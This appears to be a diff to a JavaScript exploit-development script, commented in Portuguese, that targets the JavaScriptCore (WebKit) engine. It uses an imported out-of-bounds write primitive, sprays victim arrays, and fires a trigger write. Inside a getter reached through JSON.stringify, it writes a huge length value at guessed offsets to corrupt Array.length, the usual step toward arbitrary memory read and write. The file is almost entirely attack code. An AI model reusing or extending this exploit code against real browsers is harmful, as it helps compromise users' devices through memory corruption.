@@ -11,178 +11,183 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSpeculativeArrayLength";
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForArrayLengthCorruption";
 let getter_called_flag = false;
 let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };
 
 const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-const HUGE_ARRAY_LENGTH = 0x7FFFFFFE; // Um valor de length muito grande
+const HUGE_ARRAY_LENGTH = 0x7FFFFFFE; 
+const VICTIM_ARRAY_ORIGINAL_LENGTH = 16; // Definido como constante para clareza
 
-class CheckpointForSpeculativeArrayLength {
+// Variável para manter a referência ao array vítima que será verificado pelo getter.
+// Será definida no runner e acessada no getter.
+let array_victim_for_length_test_global_ref; 
+
+class CheckpointForArrayLengthTest {
     constructor(id) {
-        this.id_marker = `SpeculativeArrayLengthCheckpoint-${id}`;
+        this.id_marker = `ArrayLengthTestCheckpoint-${id}`;
     }
 
     get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
         getter_called_flag = true;
-        const FNAME_GETTER = "SpeculativeArrayLength_Getter";
+        const FNAME_GETTER = "ArrayLengthCorruption_Getter";
         logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
         
         current_test_results = {
-            success: false, message: "Getter chamado, tentando corrupção de length de array especulativa.",
+            success: false, message: "Getter chamado, verificando corrupção de length.",
             error: null, details: ""
         };
         let details_log = [];
-        let corruption_achieved = false;
+        let internal_corruption_achieved = false;
 
         try {
-            if (!oob_array_buffer_real || !oob_write_absolute) {
-                throw new Error("oob_array_buffer_real ou oob_write_absolute não disponíveis no getter.");
+            // Teste 1: Verificar o array_victim_for_length_test_global_ref (criado ANTES do trigger)
+            if (array_victim_for_length_test_global_ref) {
+                const victim1_current_length = array_victim_for_length_test_global_ref.length;
+                details_log.push(`Array vítima (pré-criado) length: ${victim1_current_length} (Original: ${VICTIM_ARRAY_ORIGINAL_LENGTH})`);
+                if (victim1_current_length !== VICTIM_ARRAY_ORIGINAL_LENGTH) {
+                    logS3(`CORRUPÇÃO DE LENGTH (Array pré-criado)! Length: ${victim1_current_length}`, "vuln", FNAME_GETTER);
+                    current_test_results.success = true; internal_corruption_achieved = true;
+                    current_test_results.message = `Corrupção de length (Array pré-criado)! Length: ${victim1_current_length}.`;
+                }
+            } else {
+                details_log.push("Array vítima (pré-criado) não encontrado no getter.");
             }
 
-            const spray_count = 100; // Quantidade de arrays no spray
-            const original_array_element_count = 4;
-            let victim_arrays_sprayed = [];
+            // Teste 2: Criar arrays NOVOs no getter e tentar corromper seu length com escritas ESPECULATIVAS no oob_ab
+            logS3("DENTRO DO GETTER (Teste 2): Spray de novos arrays e tentativa de corrupção de length via oob_ab...", "subtest", FNAME_GETTER);
+            if (!oob_array_buffer_real || !oob_write_absolute) throw new Error("oob_ab ou oob_write_absolute não disponíveis");
 
-            logS3("DENTRO DO GETTER: Pulverizando arrays vítima...", "info", FNAME_GETTER);
-            for (let i = 0; i < spray_count; i++) {
-                let arr = new Array(original_array_element_count);
-                for(let j=0; j<original_array_element_count; j++) arr[j] = 0x42000000 + i + j;
-                victim_arrays_sprayed.push(arr);
+            const spray_count_t2 = 50;
+            const original_len_t2 = 8;
+            let new_victim_arrays_t2 = [];
+            for(let i=0; i<spray_count_t2; i++) new_victim_arrays_t2.push(new Array(original_len_t2).fill(i));
+            details_log.push(`Spray de ${spray_count_t2} novos arrays (length ${original_len_t2}) feito no getter.`);
+
+            // Onde no oob_array_buffer_real poderíamos escrever para afetar o length de um desses novos arrays?
+            // Isto é altamente especulativo. Tentaremos alguns offsets.
+            const speculative_offsets_for_length_write = [0x500, 0x508, 0x600, 0x608, 0x700, 0x708];
+            for (const spec_offset of speculative_offsets_for_length_write) {
+                if (spec_offset + 4 <= oob_array_buffer_real.byteLength) {
+                    try {
+                        oob_write_absolute(spec_offset, HUGE_ARRAY_LENGTH, 4); // Tenta escrever o length gigante
+                        details_log.push(`Escrita especulativa de length em oob_ab[${toHex(spec_offset)}]`);
+                    } catch (e_spec_write) { details_log.push(`Erro na escrita especulativa em ${toHex(spec_offset)}: ${e_spec_write.message}`);}
+                }
             }
-            details_log.push(`Spray de ${victim_arrays_sprayed.length} arrays (tamanho ${original_array_element_count}) concluído.`);
-
-            // Tentar sobrescrever um campo de 'length' especulativo DENTRO do oob_array_buffer_real.
-            // Esta é a parte mais especulativa: assumimos que um dos victim_arrays_sprayed
-            // (ou seus metadados de length) foi alocado em um offset conhecido DENTRO do oob_array_buffer_real.
-            // Isso é EXTREMAMENTE improvável devido ao Gigacage e como os objetos JS são alocados.
-            // Este teste é mais para esgotar a ideia de usar oob_write_absolute diretamente para isso.
             
-            // Vamos escolher alguns offsets dentro do oob_array_buffer_real para tentar a sorte.
-            // Estes offsets são arbitrários e não baseados em leaks.
-            const speculative_length_offsets_in_oob_ab = [0x400, 0x600, 0x800, 0xA00, 0xC00, 0xE00]; 
-            // O campo length de um Array é tipicamente um Uint32.
-
-            for (const speculative_offset of speculative_length_offsets_in_oob_ab) {
-                if (speculative_offset + 4 <= oob_array_buffer_real.byteLength) {
-                    logS3(`DENTRO DO GETTER: Tentando escrever length gigante (${toHex(HUGE_ARRAY_LENGTH)}) em oob_data[${toHex(speculative_offset)}]...`, "info", FNAME_GETTER);
-                    try {
-                        oob_write_absolute(speculative_offset, HUGE_ARRAY_LENGTH, 4); // Escreve como Uint32
-                        details_log.push(`Escrita de length gigante em ${toHex(speculative_offset)}.`);
-                    } catch (e_write) {
-                        details_log.push(`Erro ao escrever length em ${toHex(speculative_offset)}: ${e_write.message}`);
-                    }
-                }
-            }
-
-            // Verificar todos os arrays pulverizados por um length corrompido
-            logS3("DENTRO DO GETTER: Verificando arrays pulverizados por length corrompido...", "info", FNAME_GETTER);
-            for (let i = 0; i < victim_arrays_sprayed.length; i++) {
-                const arr_check = victim_arrays_sprayed[i];
-                if (!arr_check) continue;
-                const current_len = arr_check.length;
-
-                if (current_len === HUGE_ARRAY_LENGTH) {
-                    details_log.push(`SUCESSO! victim_arrays_sprayed[${i}].length é ${current_len} (GIGANTE!)`);
+            // Verificar se algum dos new_victim_arrays_t2 teve seu length corrompido
+            let new_array_corrupted = false;
+            for(let i=0; i<new_victim_arrays_t2.length; i++) {
+                if (new_victim_arrays_t2[i].length === HUGE_ARRAY_LENGTH) {
+                    details_log.push(`SUCESSO T2! new_victim_arrays_t2[${i}].length é ${HUGE_ARRAY_LENGTH}!`);
                     logS3(details_log[details_log.length-1], "vuln", FNAME_GETTER);
-                    current_test_results.success = true;
-                    current_test_results.message = `Array[${i}] teve seu length corrompido para ${toHex(current_len)}!`;
-                    
-                    // Tentar uma leitura OOB simples
-                    try {
-                        const oob_val = arr_check[original_array_element_count + 10]; // Ler um pouco além
-                        details_log.push(`  Leitura OOB de arr[${original_array_element_count + 10}] = ${String(oob_val)}`);
-                         logS3(`  Leitura OOB de arr[${original_array_element_count + 10}] = ${String(oob_val)}`, "leak", FNAME_GETTER);
-                    } catch (e_oob_arr_read) {
-                        details_log.push(`  Erro na leitura OOB do array: ${e_oob_arr_read.message}`);
-                    }
-                    corruption_achieved = true;
+                    current_test_results.success = true; internal_corruption_achieved = true;
+                    current_test_results.message += ` Corrupção de length em novo array[${i}] para ${HUGE_ARRAY_LENGTH}!`;
+                    new_array_corrupted = true;
                     break; 
-                } else if (current_len !== original_array_element_count && i < 10) { // Logar se diferente, mas não o GIGANTE
-                     details_log.push(`victim_arrays_sprayed[${i}].length: ${current_len} (inesperado, mas não o gigante)`);
+                } else if (new_victim_arrays_t2[i].length !== original_len_t2 && i < 5) { // Log se diferente, mas não o gigante, para os primeiros
+                    details_log.push(`new_victim_arrays_t2[${i}].length: ${new_victim_arrays_t2[i].length} (inesperado)`);
                 }
             }
-
-            if (!corruption_achieved) {
-                current_test_results.message = "Nenhuma corrupção de length de Array para o valor gigante foi detectada.";
+            if (new_array_corrupted) {
+                logS3("CORRUPÇÃO DE LENGTH EM ARRAY NOVO NO GETTER DETECTADA!", "vuln", FNAME_GETTER);
+            } else if (!current_test_results.success) { // Apenas se o teste do array pré-criado também não teve sucesso
+                 details_log.push("Nenhuma corrupção de length detectada nos arrays novos do getter.");
             }
-            current_test_results.details = details_log.join('; ');
+
+
+            if (!internal_corruption_achieved) { // Se nenhuma das tentativas acima funcionou
+                current_test_results.message = "Nenhuma corrupção de length (nem em array pré-criado, nem em arrays novos no getter) foi detectada.";
+            }
 
         } catch (e_getter_main) {
             logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
             current_test_results.error = String(e_getter_main);
             current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
         }
+        current_test_results.details = details_log.join('; ');
         return 0xBADF00D;
     }
 
     toJSON() {
-        const FNAME_toJSON = "CheckpointForSpeculativeArrayLength.toJSON";
+        const FNAME_toJSON = "CheckpointForArrayLengthTest.toJSON";
         logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
         // eslint-disable-next-line no-unused-vars
         const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
-        return { id: this.id_marker, processed_by_spec_arr_len_test: true };
+        return { id: this.id_marker, processed_by_array_length_test: true };
     }
 }
 
-export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
-    const FNAME_TEST_RUNNER = "executeSpeculativeArrayLengthTestRunner";
-    logS3(`--- Iniciando Teste Especulativo de Corrupção de Array.length ---`, "test", FNAME_TEST_RUNNER);
+export async function executeRetypeOOB_AB_Test() { 
+    const FNAME_TEST_RUNNER = "executeArrayLengthCorruptionTestRunner";
+    logS3(`--- Iniciando Teste de Corrupção de Length de Array (Pré e Intra-Getter) ---`, "test", FNAME_TEST_RUNNER);
 
     getter_called_flag = false;
-    current_test_results = { /* Reset inicial */ };
+    current_test_results = { success: false, message: "Teste não executado.", error: null, details: "" };
+    array_victim_for_length_test_global_ref = null; // Resetar a ref global
 
-    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }
+    if (!JSC_OFFSETS.ArrayBufferContents /* ...etc... */) { return; }
 
     try {
         await triggerOOB_primitive();
-        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
+        if (!oob_array_buffer_real || !oob_dataview_real) {
+             current_test_results.message = "OOB Init falhou.";
+             logS3(current_test_results.message, "critical", FNAME_TEST_RUNNER);
+             return;
+        }
         logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
         
-        // Escrita OOB Gatilho
+        // 1. Criar o Array Vítima (que será acessado globalmente pelo getter) ANTES da escrita OOB gatilho
+        array_victim_for_length_test_global_ref = new Array(VICTIM_ARRAY_ORIGINAL_LENGTH);
+        for(let i=0; i< VICTIM_ARRAY_ORIGINAL_LENGTH; i++) array_victim_for_length_test_global_ref[i] = 0x41410000 + i;
+        logS3(`Array vítima global criado com length ${array_victim_for_length_test_global_ref.length}. Conteúdo[0]=${toHex(array_victim_for_length_test_global_ref[0])}`, "info", FNAME_TEST_RUNNER);
+
+        // 2. Escrita OOB Gatilho
         oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
         logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);
 
-        // Criar o objeto Checkpoint. O array vítima será criado ANTES da escrita OOB gatilho
-        // para aumentar a chance (ainda que mínima) de estar adjacente a algo afetado.
-        // No entanto, o teste principal de corrupção de length ocorre no getter em arrays NOVOS.
-        // Para este teste, vamos criar o array vítima globalmente e acessá-lo no getter.
-        array_victim_for_length_test = new Array(VICTIM_ARRAY_ORIGINAL_LENGTH); // Referência global
-        for(let i=0; i< VICTIM_ARRAY_ORIGINAL_LENGTH; i++) array_victim_for_length_test[i] = 0x41410000 + i;
-        logS3(`Array vítima global para teste de length criado (length ${array_victim_for_length_test.length}).`, "info", FNAME_TEST_RUNNER);
-
-
-        const checkpoint_obj = new CheckpointForSpeculativeArrayLength(1);
-        logS3(`CheckpointForSpeculativeArrayLength objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
+        const checkpoint_obj = new CheckpointForArrayLengthTest(1);
+        logS3(`CheckpointForArrayLengthTest objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
         
         logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
         try {
             JSON.stringify(checkpoint_obj);
-        } catch (e) { /* ... */ }
+        } catch (e) { 
+            logS3(`Erro em JSON.stringify (externo): ${e.message}`, "error", FNAME_TEST_RUNNER);
+             if (!getter_called_flag) { current_test_results.message = `Erro JSON.stringify antes do getter: ${e.message}`; current_test_results.error = String(e);}
+        }
 
-    } catch (mainError) { /* ... */ }
-    finally { /* ... */ }
+    } catch (mainError) {
+        logS3(`Erro principal no runner: ${mainError.message}`, "critical", FNAME_TEST_RUNNER);
+        console.error(mainError);
+        current_test_results = { success: false, message: `Erro crítico no runner: ${mainError.message}`, error: String(mainError), details: "" };
+    } finally {
+        logS3("Limpeza finalizada.", "info", "CleanupFinal"); // Este log é do finally do runner
+    }
 
-    // Log dos resultados
     if (getter_called_flag) {
         if (current_test_results.success) {
-            logS3(`RESULTADO TESTE CORRUPÇÃO ARRAY.LENGTH: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
+            logS3(`RESULTADO TESTE ARRAY LENGTH CORRUPTION: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
         } else {
-            logS3(`RESULTADO TESTE CORRUPÇÃO ARRAY.LENGTH: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
+            logS3(`RESULTADO TESTE ARRAY LENGTH CORRUPTION: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
         }
         if (current_test_results.details) {
-             logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
+             logS3(`  Detalhes da inspeção do getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
         }
          if (current_test_results.error) {
             logS3(`  Erro reportado no getter: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
         }
     } else {
-        logS3("RESULTADO TESTE CORRUPÇÃO ARRAY.LENGTH: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
+        logS3("RESULTADO TESTE ARRAY LENGTH CORRUPTION: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
+         if (current_test_results.error) { // Se houve erro antes do getter
+            logS3(`  Erro (no runner): ${current_test_results.error} | Mensagem: ${current_test_results.message}`, "error", FNAME_TEST_RUNNER);
+        }
     }
 
     clearOOBEnvironment();
-    array_victim_for_length_test = null; // Limpar
-    logS3(`--- Teste Especulativo de Corrupção de Array.length Concluído ---`, "test", FNAME_TEST_RUNNER);
+    array_victim_for_length_test_global_ref = null; // Limpar ref global
+    logS3(`--- Teste de Corrupção de Length de Array (Pré e Intra-Getter) Concluído ---`, "test", FNAME_TEST_RUNNER);
 }
